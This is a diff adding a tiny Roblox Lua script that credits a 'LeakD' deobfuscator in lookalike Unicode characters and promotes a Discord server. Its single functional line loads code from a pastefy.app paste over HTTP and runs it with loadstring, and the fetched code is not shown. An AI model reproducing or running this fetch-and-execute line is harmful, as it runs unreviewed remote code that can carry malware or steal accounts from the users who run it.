@@ -1,0 +1,6 @@
+-- [ LeakD ] Dеobfuѕсаtеd Ԝіtһ LеаκD
+-- [ Source ] https://discord.gg/hkQAMzyGum
+
+loadstring(game:HttpGet("https://pastefy.app/YhVNx6hN/raw"))()
+
+-- https://discord.gg/hkQAMzyGum
